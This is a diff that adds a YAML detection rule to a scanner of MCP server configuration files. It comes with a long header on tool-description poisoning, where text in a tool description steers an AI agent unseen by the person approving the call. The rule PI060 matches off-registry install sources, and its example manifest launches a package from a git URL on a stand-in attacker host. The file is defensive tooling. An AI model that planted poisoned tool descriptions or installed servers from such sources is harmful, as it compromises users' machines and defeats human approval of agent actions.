@@ -1,0 +1,96 @@
+category: mcp_tool_poisoning
+default_severity: MEDIUM
+# CAT-02 (#34): the attack the user never sees. An MCP server hands the agent a
+# tool `description` on every call; the host UI shows the tool NAME. Anything
+# written into the description is read by the model and never surfaced to the
+# person approving the call. This file also carries the config-hygiene signals
+# that describe how such a server arrives in the first place -- who published
+# it, over what transport, and what its launch command actually executes.
+#
+# THE PROJECTION SEMANTICS EVERY STRUCTURAL REGEX HERE DEPENDS ON.
+# A `scope: frontmatter` rule never sees prose. It matches the canonical
+# `path = value` projection src/frontmatter.rs emits from real parsed
+# configuration, ONE PROJECTED LINE AT A TIME -- so no regex here can require
+# two leaves to co-occur. Three further rules follow from what
+# 04-RESEARCH.md Q1/Q2 measured across 46-49 real manifests on a developer
+# machine:
+#
+#   - NO REGEX MAY REQUIRE A WRAPPER KEY AS A PREFIX. Real manifests use four
+#     top-level conventions -- `mcpServers` (Claude family), `servers`
+#     (VS Code family), `mcp` (opencode), and NO WRAPPER AT ALL (the server
+#     name is the top-level key; 9 of 17 sampled plugin `.mcp.json` files).
+#     A pattern anchored on `^mcpServers\.` was measured to miss two of three
+#     real shapes. Every key below is therefore LEAF-ANCHORED with `(?:^|\.)`.
+#   - A string value renders WITHOUT quotes. `"command": "npx"` projects as
+#     `command = npx`, never `command = "npx"`.
+#   - An array projects ONE LINE PER ELEMENT with an `[index]` suffix, so
+#     `"args": ["-y", "pkg"]` is two lines. opencode additionally expresses
+#     `command` itself as an array, so `command` carries the same optional
+#     `[\d+]` suffix as `args`.
+#
+# SEVERITY SPLIT. The category default is MEDIUM, not HIGH, and that is
+# deliberate: seven of this category's ten planned arms are heuristic or
+# supply-chain signals, and PATTERNS.md grades heuristics at MEDIUM by rule
+# while warning that HIGH is the severity `install-hook` blocks commits at.
+# D-03 requires the config-hygiene band (PI060-PI062 below) to sit BELOW the
+# commit-blocking line; inheriting the category default satisfies that by
+# construction rather than by three separate fields each of which could be
+# forgotten. The description-poisoning arms that follow in a later plan carry
+# an explicit HIGH override instead.
+#
+# THE MEASURED GAP, NAMED HERE RATHER THAN LEFT FOR REVIEW.
+# D-03 lists "unpinned `npx -y <pkg>` servers" in scope. PI060 implements the
+# UNVETTED-SOURCE half of that decision and deliberately does NOT detect the
+# plain unpinned registry install. Measured 2026-09-06 with a scratch probe
+# outside this repository, over the 46 real `.mcp.json` / `mcp.json` /
+# `claude_desktop_config.json` files inside the 04-SWEEP.md directory list:
+# 8 distinct real manifests launch a package runner (`npx`/`uvx`/`bunx`), 6 of
+# them with a bare `-y`, and exactly 1 uses an off-registry source. That is 8
+# of the 24 manifests declaring any launch command at all -- the ecosystem
+# default, not an outlier. This repository's own false-positive gate already
+# contains the shape: tests/corpus/clean/mcp-dev-tooling-setup.json is built
+# from `npx -y @example/docs-search-mcp`. A pattern firing on the ecosystem
+# default is unshippable at any severity, so the discriminator is the install
+# SOURCE (an off-registry URL, a git reference, a tarball) rather than the
+# absence of a version pin. The accepted cost is that
+# tests/corpus/attack/structural/mcp-tool-poisoning/07-unpinned-npx-install-mcpservers.md
+# stays an undetected payload on purpose.
+patterns:
+  - id: PI060
+    example: |
+      {
+        "mcpServers": {
+          "quick-utils": {
+            "command": "npx",
+            "args": ["-y", "git+https://github.com/example-attacker/quick-utils-mcp"]
+          }
+        }
+      }
+    counter_example: |
+      {
+        "mcpServers": {
+          "docs-search": {
+            "command": "npx",
+            "args": ["-y", "@example/docs-search-mcp"]
+          }
+        }
+      }
+    # Drops ONLY the off-registry-source narrowing, keeping the same leaf
+    # anchoring: any install-source-shaped argument at all, including the
+    # plain registry package name the counter_example above uses. That is
+    # exactly the measured ecosystem-default shape, which is what makes the
+    # counter_example the specimen that catches a relaxation of this pattern.
+    relaxed_pattern: "(?:^|\\.)(?:args|command)(?:\\[\\d+\\])?\\s*=\\s*@?[A-Za-z0-9][A-Za-z0-9._@/+-]*\\s*$"
+    name: unvetted-mcp-server-source
+    scope: frontmatter
+    # Leaf-anchored on `args` or `command`, both with the array-index
+    # tolerance the projection forces. The VALUE must be an off-registry code
+    # source: a `git+<scheme>://` / `ssh://` / `git://` URL, an `scp`-style
+    # `git@host:path` reference, a `github:`/`gitlab:`/`bitbucket:` shorthand,
+    # or an archive fetched over HTTP(S) (`.git`, `.tgz`, `.tar.gz`, `.zip`).
+    # A bare registry package name -- pinned or not -- is not a match; see the
+    # measured gap in the header above.
+    pattern: "(?:^|\\.)(?:args|command)(?:\\[\\d+\\])?\\s*=\\s*(?:(?:git\\+[a-z][a-z0-9+.-]*|ssh|git)://\\S+|git@[A-Za-z0-9._-]+:\\S+|(?:github|gitlab|bitbucket):[A-Za-z0-9._-]+/\\S+|https?://\\S+\\.(?:git|tgz|tar\\.gz|zip)(?:[?#]\\S*)?)\\s*$"
+    description: "An MCP server entry installs from an off-registry source — a git reference, an archive URL or a repository shorthand — so the code the agent loads was never published to, or vetted by, a package registry"
+    remediation: "Install MCP servers from a package registry and pin the version, or vendor and review the source yourself before pointing a server entry at it."
+    tags: [mcp-tool-poisoning, supply-chain]
